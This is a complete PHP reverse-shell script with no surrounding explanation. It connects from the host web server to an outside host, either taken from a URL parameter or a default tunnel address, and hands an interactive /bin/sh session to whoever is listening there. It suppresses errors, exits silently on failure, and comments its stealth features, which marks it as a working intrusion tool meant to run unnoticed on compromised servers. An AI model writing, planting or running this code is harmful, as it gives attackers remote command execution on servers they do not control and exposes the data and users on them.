<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

// Hide all output
if (ob_get_level()) ob_end_clean();
ob_implicit_flush(false);

// Get Telebit host from URL parameter
$telebit_host = $_GET['url'] ?? 'giant-newt.mylocal.io';

// Clean the host parameter
$telebit_host = preg_replace('/^https?:\/\//', '', $telebit_host);
$telebit_host = preg_replace('/\/.*$/', '', $telebit_host);

if (empty($telebit_host)) {
    exit(0); // Silent exit
}

$port = 443;

// Try SSL first, then fallback to HTTP
$sock = @fsockopen("ssl://" . $telebit_host, $port, $errno, $errstr, 20);
if (!$sock) {
    $sock = @fsockopen($telebit_host, 80, $errno, $errstr, 20);
}

if (!$sock) {
    exit(0); // Silent exit on failure
}

// Start reverse shell
$process = @proc_open('/bin/sh -i', array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"), 
    2 => array("pipe", "w")
), $pipes);

if (!is_resource($process)) {
    @fclose($sock);
    exit(0);
}

// Set non-blocking mode
@stream_set_blocking($pipes[0], 0);
@stream_set_blocking($pipes[1], 0);
@stream_set_blocking($pipes[2], 0);
@stream_set_blocking($sock, 0);

// Stealth main loop
$max_duration = 3600; // 1 hour maximum

for ($i = 0; $i < $max_duration; $i++) {
    if (@feof($sock) || @feof($pipes[1])) break;
    
    $status = @proc_get_status($process);
    if (!$status['running']) break;
    
    // Telebit → Shell
    $input = @fread($sock, 8192);
    if ($input) @fwrite($pipes[0], $input);
    
    // Shell → Telebit  
    $output = @fread($pipes[1], 8192);
    if ($output) @fwrite($sock, $output);
    
    $error = @fread($pipes[2], 8192);
    if ($error) @fwrite($sock, $error);
    
    usleep(100000);
}

// Silent cleanup
if (is_resource($sock)) @fclose($sock);
if (is_resource($pipes[0])) @fclose($pipes[0]);
if (is_resource($pipes[1])) @fclose($pipes[1]);
if (is_resource($pipes[2])) @fclose($pipes[2]);
if (is_resource($process)) {
    @proc_terminate($process);
    @proc_close($process);
}

exit(0);
?>